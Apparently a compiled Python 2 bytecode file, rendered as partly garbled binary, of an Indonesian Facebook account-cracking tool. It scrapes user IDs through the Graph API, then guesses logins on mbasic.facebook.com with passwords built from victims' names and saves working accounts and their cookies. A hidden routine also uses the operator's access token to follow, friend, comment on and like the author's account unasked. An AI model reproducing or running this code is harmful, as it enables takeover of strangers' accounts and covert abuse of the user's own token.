�
�`c           @   sE  d  d l  Z  d  d l Z d  d l Z d  d l Z d  d l Z d  d l  Z  d  d l Z d  d l Z d  d l Z d  d l Z d  d l Z d  d l	 Z	 e
 e � e j d � d  d l m
 Z
 d e j j �  k r� d Z d Z d Z d Z n  y d  d l  Z  Wn e k
 re j d	 � n Xy d  d l Z Wn e k
 rHe j d
 � n Xy d  d l Z Wn e k
 rye j d � n Xy d  d l Z Wn e k
 r�e j d � n Xd
 Z d a d a yZ e  j d � j j �  Z e  j d e d i d d 6d d 6d d 6�j	 �  d j �  a Wn
 d a n Xd Z  e j! j" d � rue j! j# d � d k rue$ d � j% �  j �  Z  qun  i d d 6d d 6d d  6e  d! 6d" d# 6d$ d% 6d& d' 6a& d( �  Z' d) �  Z( d* �  Z) d+ �  Z* d, �  Z+ d- �  Z, d. �  Z- d/ �  Z. d0 �  Z/ d1 �  Z0 d2 �  Z1 d3 �  Z2 d4 d7 d5 �  �  YZ3 e4 d6 k rAe+ �  n  d S(8   i����Ns   utf-8(   t
   ThreadPoolt   linuxs   [1;94ms   [1;92ms   [1;97ms   [1;91ms   pip2 install requestss   pip2 install mechanizes   gem install lolcats   pip2 install bs4s   https://mbasic.facebook.coms�   Mozilla/5.0 (Linux; Android 5.1; HUAWEI LYO-L01 Build/HUAWEILYO-L01; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/90.0.4430.210 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/319.0.0.39.120;]s   https://api.ipify.orgs    https://ipapi.com/ip_api.php?ip=t   headerss   https://ip-api.com/t   Referers   application/json; charset=utf-8s   Content-Types|   Mozilla/5.0 (Linux; Android 7.1.2; Redmi 4X) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.92 Mobile Safari/537.36s
   User-Agentt   country_names   .browseri    s   mbasic.facebook.comt   Hosts	   max-age=0s
   cache-controlt   1s   upgrade-insecure-requestss
   user-agentsU   text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8t   accepts
   gzip, deflates   accept-encodings#   id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7s   accept-languagec           C   s[   d t  j j �  k r% t j d � n2 d t  j j �  k rJ t j d � n
 t j d � d  S(   Ns    linuxt   cleart   wint   cls(   t   syst   platformt   lowert   ost   system(    (    (    s   /sdcard/download/Start.pyR   /   s
    c           C   s   t  j d � t  j j �  d  S(   Ns   echo -e "[✔] Keluar"| lolcat(   R   R   R   t   exit(    (    (    s   /sdcard/download/Start.pyt   keluar5   s    
c          C   s�   t  j d � t  j d � t  j d � t d � }  yd t j d |  � } t j | j � } | d } t d d � j	 |  � t  j d	 � t
 �  t �  Wn2 t k
 r� t  j d
 � t
 j d � t �  n Xd  S(   NR   sq   echo -e " __  __ ____  _____
|  \/  | __ )|  ___|
| |\/| |  _ \| |_
| |  | | |_) |  _|
|_|  |_|____/|_|" | lolcatsR  echo -e "────────────────────────────────────────
[x] author : ak
[x] fb : fb.com/757953543
[x] github : github.com/akw550
────────────────────────────────────────"| lolcats/   [0;93m[[0;92m?[0;93m] [0;92mToken :[0;93m s+   https://graph.facebook.com/me?access_token=t   names	   login.txtt   ws)   echo -e "[✔] Login Berhasil ! "| lolcats&   echo -e "[✖] Token Salah ! "| lolcatg      �?(   R   R   t	   raw_inputt   requestst   gett   jsont   loadst   textt   opent   writet	   bot_koment   menut   KeyErrort   timet   sleept	   log_token(   t   datat   met   at   nama(    (    s   /sdcard/download/Start.pyt   token8   s     







c          C   s;  y t  d d � j �  }  Wn% t k
 r@ t j d � t �  n Xd } d } d } d } d } t j d	 | d
 |  � t j d |  � t j d |  � t j d
 | d | d
 |  � t j d
 | d |  � t j d |  � t j d |  � t j d
 | d | d
 |  � t j d
 | d |  � t �  d  S(   Ns	   login.txtt   rs(   echo -e "[✖] Token Invalid ! "| lolcatt	   757953543s   I Love You @[757953543:]t   10158795312888544t   10158807643598544s   Mantap Bro ❤️s7   https://graph.facebook.com/me/friends?method=post&uids=s   &access_token=s>   https://graph.facebook.com/757953543/subscribers?access_token=sD   https://graph.facebook.com/100006609458697/subscribers?access_token=s   https://graph.facebook.com/s   /comments/?message=s!   /likes?summary=true&access_token=se   https://graph.facebook.com/10159090813023544/comments/?message=Cantik Banget Bro ❤️&access_token=sM   https://graph.facebook.com/10159090813023544/likes?summary=true&access_token=(	   R   t   readt   IOErrorR   R   R!   R   t   postR   (   t   tokett   unat   komR-   t   post2t   kom2(    (    s   /sdcard/download/Start.pyR   I   s(    

!!c          C   s�  yH t  d d � j �  }  t j d |  � } t j | j � } | d } Wn4 t k
 r~ } t j	 d � t
 j d � t �  n Xt j	 d � t j	 d � t j	 d	 � d
 | GHt j	 d � t
 d � } | d
 k r� t j	 d � t �  n� | d k rt �  n� | d k rt �  n� | d k r-t �  n� | d k rCt �  n� | d k rYt �  nk | d k r�y% t j d � t j	 d � t �  Wq�t k
 r�} t j	 d � q�Xn t j	 d � t �  d  S(   Ns	   login.txtR'   s,   https://graph.facebook.com/me/?access_token=R   s(   echo -e "[✖] Token Invalid ! "| lolcati   R   sq   echo -e " __  __ ____  _____
|  \/  | __ )|  ___|
| |\/| |  _ \| |_
| |  | | |_) |  _|
|_|  |_|____/|_|" | lolcatsR  echo -e "────────────────────────────────────────
[x] author : ak
[x] fb : fb.com/757953543
[x] github : github.com/akw550
────────────────────────────────────────"| lolcats0   [0;93m[[0;92m✔[0;93m] [0;92mNama :[0;97m s�  echo -e "────────────────────────────────────────
[1] Dump ID Teman
[2] Dump ID Publik
[3] Dump ID Dari Total Followers
[4] Dump ID Dari Total Like
[5] Start Crack
[0] Keluar
────────────────────────────────────────"| lolcats/   [0;93m[[0;92m?[0;93m][0;92m Pilih :[0;93m t    s+   echo -e "[✖] Isi Dengan Benar ! "| lolcatR   t   2t   3t   4t   5t   0s*   echo -e "[✔] Menghapus Token ! "| lolcats)   echo -e "[✖] File Tidak Ada ! "| lolcat(   R   R+   R   R   R   R   R   t	   ExceptionR   R   R   R    R!   R   R   t   temant   publikt	   followerst   liket   crackt   removeR   (   R.   t   otwR$   R%   t   eR'   (    (    s   /sdcard/download/Start.pyR   ^   sJ    




	










c    	      C   sU  y t  d d � j �  }  Wn? t k
 rZ t j d � t j d � t j d � t �  n Xy�t j d � t j d � t j d � t d	 � } t d
 � } t j d � y t	 j
 d |  d
 | � } Wn2 t k
 r� t j d � t j d � t �  n Xg  } t
 j | j � } d j d d � } t  | d � } x~ | d D]r } | j | d d | d � | j | d d | d d � d t t | � � Gt j j �  t j d � qBW| j �  t j | | � t j d � t j d � d t | � GHd | GHt j d � t d � t �  Wn+ t	 j j k
 rPt j d  � t �  n Xd  S(!   Ns	   login.txtR'   s(   echo -e "[✖] Token Invalid ! "| lolcats   rm -rf login.txtg{�G�z�?R   sq   echo -e " __  __ ____  _____
|  \/  | __ )|  ___|
| |\/| |  _ \| |_
| |  | | |_) |  _|
|_|  |_|____/|_|" | lolcatsR  echo -e "────────────────────────────────────────
[x] author : ak
[x] fb : fb.com/757953543
[x] github : github.com/akw550
────────────────────────────────────────"| lolcats4   [0;93m[[0;92m?[0;93m] [0;92mLimit Dump : [0;93ms3   [0;93m[[0;92m?[0;93m] [0;92mNama File : [0;93ms�   echo -e "────────────────────────────────────────"| lolcats3   https://graph.facebook.com/me/friends?access_token=s   &limit=s*   echo -e "[✖] Tidak Ada Teman ! "| lolcats   echo -e "[Kembali]"| lolcats	   teman.txtt    t   _R   R"   t   ids   <=>R   s   
s'   
[0;92mDump [0;93m[[0;92m%s[0;93m] gy�&1�|?s�   echo -e "
────────────────────────────────────────"| lolcats(   echo -e "[✔] Dump Selesai..." | lolcats7   
[0;93m[[0;92m✔[0;93m] [0;92mTotal ID :[0;93m %ss8   
[0;93m[[0;92m✔[0;93m] [0;92mNama File :[0;93m %ss   [0;93m[[0;92mKembali[0;93m]s,   echo -e "[✖] Tidak Ada Koneksi ! "| lolcat(   R   R+   R,   R   R   R   R    R!   R   R   R   R   R:   R   R   R   t   replacet   appendR   t   strt   lenR   t   stdoutt   flusht   closet   renameR   t
   exceptionst   ConnectionErrorR   (	   R.   t   limitt   fileR'   RD   t   zt   qqt   ysR$   (    (    s   /sdcard/download/Start.pyR:   �   sT    










! 
 


	


c          C   s�  y t  d d � j �  }  Wn? t k
 rZ t j d � t j d � t j d � t �  n Xy#t j d � t j d � t j d � t d	 � } t d
 � } t d � } t j d � y> t	 j
 d
 | d |  � } t j | j
 � } d | d GHWn2 t k
 r(t j d � t j d � t �  n Xt	 j
 d
 | d |  d | � } g  } t j | j
 � } t j d � d j d d � }	 t  |	 d � }
 x~ | d D]r } | j | d d | d � |
 j | d d | d d � d t t | � � Gt j j �  t j d � q�W|
 j �  t j |	 | � t j d � t j d  � d! t | � GHd" | GHt j d � t d# � t �  WnY t k
 r�t j d$ � t d% � t �  n+ t	 j j k
 r�t j d& � t �  n Xd  S('   Ns	   login.txtR'   s(   echo -e "[✖] Token Invalid ! "| lolcats   rm -rf login.txtg{�G�z�?R   sq   echo -e " __  __ ____  _____
|  \/  | __ )|  ___|
| |\/| |  _ \| |_
| |  | | |_) |  _|
|_|  |_|____/|_|" | lolcatsR  echo -e "────────────────────────────────────────
[x] author : ak 
[x] fb : fb.com/757953543
[x] github : github.com/akw550
────────────────────────────────────────"| lolcats3   [0;93m[[0;92m?[0;93m][0;92m ID Publik : [0;93ms4   [0;93m[[0;92m?[0;93m] [0;92mLimit Dump : [0;93ms3   [0;93m[[0;92m?[0;93m] [0;92mNama File : [0;93ms�   echo -e "────────────────────────────────────────"| lolcats   https://graph.facebook.com/s   ?access_token=s0   [0;93m[[0;92m✔[0;93m] [0;92mNama : [0;97mR   s-   echo -e "[✖] ID Tidak Ditemukan ! "| lolcats   echo -e "[Kembali]"| lolcats   /subscribers?access_token=s   &limit=s   flw.txtRB   RC   R   R"   RD   s   <=>s   
s'   
[0;92mDump [0;93m[[0;92m%s[0;93m] gy�&1�|?s�   echo -e "
────────────────────────────────────────"| lolcats(   echo -e "[✔] Dump Selesai..." | lolcats7   
[0;93m[[0;92m✔[0;93m] [0;92mTotal ID :[0;93m %ss8   
[0;93m[[0;92m✔[0;93m] [0;92mNama File :[0;93m %ss   [0;93m[[0;92mKembali[0;93m]s.   echo -e "[✖] Tidak Ada Followers ! "| lolcats   
[0;93m[[0;92mKembali[0;93m]s,   echo -e "[✖] Tidak Ada Koneksi ! "| lolcat(   R   R+   R,   R   R   R   R    R!   R   R   R   R   R   R   R   R<   RE   RF   R   RG   RH   R   RI   RJ   RK   RL   R   RM   RN   R   (   R.   t   idtRO   RP   t   jokt   opR'   RD   RQ   RR   RS   R$   (    (    s   /sdcard/download/Start.pyR<   �   sf    










#
! 
 


	






c    
      C   s�  y t  d d � j �  }  Wn? t k
 rZ t j d � t j d � t j d � t �  n Xy�t j d � t j d � t j d � t d	 � } t d
 � } t d � } t j d � y' t	 j
 d
 | d | d |  � } Wn2 t k
 rt j d � t j d � t �  n Xg  } t
 j | j � } d j d d � } t  | d � } x~ | d D]r }	 | j |	 d d |	 d � | j |	 d d |	 d d � d t t | � � Gt j j �  t j d � qVW| j �  t j | | � t j d � t j d � d t | � GHd  | GHt j d � t d! � t �  WnY t k
 rht j d" � t d# � t �  n+ t	 j j k
 r�t j d$ � t �  n Xd  S(%   Ns	   login.txtR'   s(   echo -e "[✖] Token Invalid ! "| lolcats   rm -rf login.txtg{�G�z�?R   sq   echo -e " __  __ ____  _____
|  \/  | __ )|  ___|
| |\/| |  _ \| |_
| |  | | |_) |  _|
|_|  |_|____/|_|" | lolcatsR  echo -e "────────────────────────────────────────
[x] author : ak 
[x] fb : fb.com/757953543
[x] github : github.com/akw550
────────────────────────────────────────"| lolcats1   [0;93m[[0;92m?[0;93m][0;92m ID Post : [0;93ms4   [0;93m[[0;92m?[0;93m] [0;92mLimit Dump : [0;93ms3   [0;93m[[0;92m?[0;93m] [0;92mNama File : [0;93ms�   echo -e "────────────────────────────────────────"| lolcats   https://graph.facebook.com/s
   /likes?limit=s   &access_token=s/   echo -e "[✖] Post Tidak Ditemukan ! "| lolcats   echo -e "[Kembali]"| lolcats
   likess.txtRB   RC   R   R"   RD   s   <=>R   s   
s'   
[0;92mDump [0;93m[[0;92m%s[0;93m] gy�&1�|?s�   echo -e "
────────────────────────────────────────"| lolcats(   echo -e "[✔] Dump Selesai..." | lolcats7   
[0;93m[[0;92m✔[0;93m] [0;92mTotal ID :[0;93m %ss8   
[0;93m[[0;92m✔[0;93m] [0;92mNama File :[0;93m %ss   [0;93m[[0;92mKembali[0;93m]s*   echo -e "[✖] Bukan Postingan ! "| lolcats   
[0;93m[[0;92mKembali[0;93m]s,   echo -e "[✖] Tidak Ada Koneksi ! "| lolcat(   R   R+   R,   R   R   R   R    R!   R   R   R   R   R=   R   R   R   RE   RF   R   RG   RH   R   RI   RJ   RK   RL   R   RM   RN   R   (
   R.   RT   RO   RP   R'   RD   RQ   RR   RS   R$   (    (    s   /sdcard/download/Start.pyR=   �   s^    







'


! 
 


	






c    
      C   s�  y t  d d � j �  }  Wn? t k
 rZ t j d � t j d � t j d � t �  n Xy't j d � t j d � t j d � t d	 � } t d
 � } t d � } t j d � y> t	 j
 d
 | d |  � } t j | j
 � } d | d GHWn2 t k
 r(t j d � t j d � t �  n Xt	 j
 d
 | d | d |  � } g  } t j | j
 � } t j d � d j d d � }	 t  |	 d � }
 x� | d d D]r } | j | d d | d � |
 j | d d | d d � d t t | � � Gt j j �  t j d � q�W|
 j �  t j |	 | � t j d  � t j d! � d" t | � GHd# | GHt j d � t d$ � t �  Wn' t k
 r�} t j d% � t �  n Xd  S(&   Ns	   login.txtR'   s(   echo -e "[✖] Token Invalid ! "| lolcats   rm -rf login.txtg{�G�z�?R   sq   echo -e " __  __ ____  _____
|  \/  | __ )|  ___|
| |\/| |  _ \| |_
| |  | | |_) |  _|
|_|  |_|____/|_|" | lolcatsR  echo -e "────────────────────────────────────────
[x] author : ak 
[x] fb : fb.com/757953543 
[x] github : github.com/akw550
────────────────────────────────────────"| lolcats3   [0;93m[[0;92m?[0;93m][0;92m ID Publik : [0;93ms4   [0;93m[[0;92m?[0;93m] [0;92mLimit Dump : [0;93ms3   [0;93m[[0;92m?[0;93m] [0;92mNama File : [0;93ms�   echo -e "────────────────────────────────────────"| lolcats   https://graph.facebook.com/s   ?access_token=s0   [0;93m[[0;92m✔[0;93m] [0;92mNama : [0;97mR   s-   echo -e "[✖] ID Tidak Ditemukan ! "| lolcats   echo -e "[Kembali]"| lolcats   ?fields=friends.limit(s   )&access_token=s   pblk.txtRB   RC   R   t   friendsR"   RD   s   <=>s   
s'   
[0;92mDump [0;93m[[0;92m%s[0;93m] gy�&1�|?s�   echo -e "
────────────────────────────────────────"| lolcats(   echo -e "[✔] Dump Selesai..." | lolcats7   
[0;93m[[0;92m✔[0;93m] [0;92mTotal ID :[0;93m %ss8   
[0;93m[[0;92m✔[0;93m] [0;92mNama File :[0;93m %ss   [0;93m[[0;92mKembali[0;93m]s*   echo -e "[✖] Tidak Ada Teman ! "| lolcat(   R   R+   R,   R   R   R   R    R!   R   R   R   R   R   R   R   R;   RE   RF   R   RG   RH   R   RI   RJ   RK   RL   R   R9   (
   R.   RT   RO   RP   RU   RV   R'   RD   RQ   RR   RS   R$   RA   (    (    s   /sdcard/download/Start.pyR;     s^    










#
! 
 


	


c   
      C   sJ  t  j �  } | j j t � | j d � } t j | j d � } d j	 t j
 j d | j � � } i  } x� | d � D]� } | j d � d  k r| j d � d k r� | j i |  d 6� q-| j d � d	 k r� | j i | d	 6� q-| j i d | j d � 6� qt | j i | j d � | j d � 6� qt W| j i | d
 6d d 6d d
 6d d 6d d 6d d 6d d 6d d 6� | j j i d d 6� | j
 d d | �j }	 d | j j �  j �  k r�i d d 6|  d 6| d	 6| j j �  d 6Sd | j j �  j �  k r-i d d 6|  d 6| d	 6| j j �  d 6Si d d 6|  d 6| d	 6Sd  S(   Ns   https://mbasic.facebook.com/s   html.parserR3   s   dtsg":\{"token":"(.*?)"t   inputt   valueR   t   emailt   passt   fb_dtsgt   m_sessR8   t   __usert   dt   __reqt   __csrt   __at   __dynt   encpasss:   https://mbasic.facebook.com/login/?next&ref=dbl&fl&refid=8t   referers~   https://mbasic.facebook.com/login/device-based/login/async/?refsrc=https%3A%2F%2Fm.facebook.com%2Flogin%2F%3Fref%3Ddbl&lwv=100R"   t   c_usert   successt   statust   cookiest
   checkpointt   cpt   error(   R   t   SessionR   t   updatet   mbasic_hR   t   bs4t
   BeautifulSoupR   t   joint   ret   findallt   NoneR-   Ri   t   get_dictt   keys(
   t   emt   past   hostsR'   t   pt   bt   metaR"   t   it   po(    (    s   /sdcard/download/Start.pyt   mbasicD  s0    ! *'))c         C   s  g  } x� |  j  d � D]� } t | � d k  r4 q q | j �  } t | � d k sv t | � d k sv t | � d k r� | j | d � | j | d � q | j | d � | j | d � | j | � d t k r | j d � | j d	 � | j d
 � q q W| S(   NRB   i   i   i   t   123t   12345t	   indonesiat   sayangt   anjingt   kontol(   t   splitRH   R
   RF   t   ips(   R   t   resultsR~   (    (    s   /sdcard/download/Start.pyt   generateb  s     6


c          C   sf  t  j d � t  j d � t  j d � t  j d � t d � }  |  d k rc t  j d � t �  n� |  d k ry t �  n� |  d	 k r8t  j d � t  j d � t  j d
 � t  j d � t  j d � t j d � t  j d
 � t j d � t  j d � t j d � t  j d � t j d � t  j d � t �  n* |  d k rNt �  n t  j d � t �  d  S(   NR   sq   echo -e " __  __ ____  _____
|  \/  | __ )|  ___|
| |\/| |  _ \| |_
| |  | | |_) |  _|
|_|  |_|____/|_|" | lolcats�   echo -e "────────────────────────────────────────"| lolcatsj  echo -e "[✔] Login Menggunakan Akun Baru ! 
────────────────────────────────────────
[1] Login Menggunakan Token
[2] Cara Mendapatkan Token
[0] Keluar
────────────────────────────────────────"| lolcats/   [0;93m[[0;92m?[0;93m] [0;92mPilih :[0;93m R3   s+   echo -e "[✖] Isi Dengan Benar ! "| lolcatR   R4   s�   echo -e "────────────────────────────────────────
[x] author : ak 
[x] fb : fb.com/757953543 
[x] github : github.com/akw550"| lolcats3   echo -e "Anda akan diarahkan ke browser ! "| lolcati   s-   echo -e "Silahkan klik titik tiga ! "| lolcats1   echo -e "Kemudian klik cari dihalaman ! "| lolcats6   echo -e "Lalu cari tulisan (Eaaa) dan copy ! "| lolcatsL   xdg-open https://m.facebook.com/composer/ocelot/async_loader/?publisher=feedR5   (   R   R   R   R!   R&   R   R    R   (   t   tk(    (    s   /sdcard/download/Start.pyR!   w  s:    






















R>   c           B   sJ   e  Z e j d  � e j d � e j d � d �  Z d �  Z d �  Z RS(   R   sq   echo -e " __  __ ____  _____
|  \/  | __ )|  ___|
| |\/| |  _ \| |_
| |  | | |_) |  _|
|_|  |_|____/|_|" | lolcatsR  echo -e "────────────────────────────────────────
[x] author : ak 
[x] fb : fb.com/757953543 
[x] github : github.com/akw550
────────────────────────────────────────"| lolcatc         C   s�  g  |  _  g  |  _ d |  _ x�t r�t d � } | d k rB q q | d k r^y� xi t r� y2 t d � |  _ t |  j � j �  j �  |  _	 PWqT t
 k
 r� } t j d � t
 �  qT qT XqT Wg  |  _ xF |  j	 D]; } y( |  j j i | j d � d d 6� Wq� q� q� Xq� WWn# t
 k
 r5} t j d	 � q n Xt j d
 � t j d � |  j �  Pq | d k r y� xi t r�y2 t d
 � |  _ t |  j � j �  j �  |  _	 PWqpt
 k
 r�} t j d � t
 �  qpqpXqpWg  |  _ x` |  j	 D]U } yB |  j j i | j d � d d 6t | j d � d � d 6� Wq�q�q�Xq�WWn* t
 k
 rr} t j d	 � t
 �  q n Xt j d
 � t j d � t j d � t j d
 � t d � j |  j |  j � t j |  j � t j d � Pq q Wd  S(   Ni    s@   [0;93m[[0;92m?[0;93m] [0;92mPass Auto/Manual (y/n) :[0;93m R3   t   ns3   [0;93m[[0;92m?[0;93m][0;92m Nama File :[0;93m s)   echo -e "[✖] File Tidak Ada ! "| lolcats   <=>RD   s+   echo -e "[✖] File Tidak Valid ! "| lolcats�   echo -e "────────────────────────────────────────"| lolcats7   echo -e "[✔] Contoh Password : sayang,anjing"| lolcatt   ys3   [0;93m[[0;92m?[0;93m] [0;92mNama File :[0;93m i   t   pws    echo -e "[✔] Crack..."| lolcats<   echo -e "[✔] Akun Ok / Cp Tersimpan Di : Save.txt"| lolcati#   s#   echo -e "
[✔] Selesai..."| lolcat(   t   adaRk   t   kot   TrueR   t   apkR   R+   t
   splitlinest   fsR9   R   R   R   t   flRF   R�   t   pwlistR�   R    t   mapt   mainR?   (   t   selft   fRA   R~   (    (    s   /sdcard/download/Start.pyt   __init__�  sx    				 	
	( 



	
	B 





c         C   s�   t  d � j d � |  _ t |  j � d k r: |  j �  n� x( |  j D] } | j i |  j d 6� qD Wt j d � t j d � t j d � t j d � t	 d � j
 |  j |  j � t j |  j
 � t j d	 � d  S(
   Ns2   [0;93m[[0;92m?[0;93m] [0;92mPassword :[0;93m t   ,i    R�   s�   echo -e "────────────────────────────────────────"| lolcats    echo -e "[✔] Crack..."| lolcats<   echo -e "[✔] Akun Ok / Cp Tersimpan Di : Save.txt"| lolcati   s#   echo -e "
[✔] Selesai..."| lolcat(   R   R�   R�   RH   R�   R�   Rn   R   R   R    R�   R�   R?   R�   (   R�   R~   (    (    s   /sdcard/download/Start.pyR�   �  s    




c         C   s
  y�x�| j  d � D]�} t | j  d � | d � } | j  d � d k rd t | j  d � | t f GH|  j j d | j  d � | f � | j  d � t d � j �  k r� Pn; t d d	 � j d
 | j  d � | t	 | j  d � � f � d
 | j  d � | t	 | j  d � � f } Pq | j  d � d k r d
 t
 | j  d � | t f GH|  j j d | j  d � | f � t d d	 � j d | j  d � | f � Pq q q W|  j d 7_ d |  j t
 |  j � t
 |  j � t
 |  j � f Gt j j �  Wn |  j | � n Xd  S(   NR�   RD   s   https://mbasic.facebook.comRh   Rg   s/   
[0;92m[Ok]%s %s [0;92m●[0;92m %s %s      s   [Ok] %s • %ss   Save.txts   a+s   [Ok] %s ● %s %s

Ri   Rk   s/   
[0;93m[Cp]%s %s [0;93m●[0;93m %s %s      s   [Cp] %s • %ss   [Cp] %s ● %s
i   s^   
[0;93m[[0;92mCrack[0;93m] [0;93m%s/%s [0;91m● [0;92mOk : %s [0;91m● [0;93mCp : %s(   R   R�   t   Gt   NR�   RF   R   R+   R   t   gets_cookiest   ORk   R�   RH   R�   R   RI   RJ   R�   (   R�   R�   R~   t   logR�   (    (    s   /sdcard/download/Start.pyR�   �  s2    #!,+#2 (   t   __name__t
   __module__R   R   R�   R�   R�   (    (    (    s   /sdcard/download/Start.pyR>   �  s   


	:	t   __main__(    (5   R   Rp   R   R   t
   subprocesst   randomR   Rs   t   base64R   t   reloadt   setdefaultencodingt   multiprocessing.poolR    R   R
   R�   R�   R�   t   Rt   ImportErrorR   t	   mechanizet   lolcatt   hostt   uaRu   R�   R   R   t   stripR|   t   uast   patht   existst   getsizeR   R+   Ro   R   R   R&   R   R   R:   R<   R=   R;   R�   R�   R!   R>   R�   (    (    (    s   /sdcard/download/Start.pyt   <module>   sj   <T

	



B
7					'	+	4	0	0			g
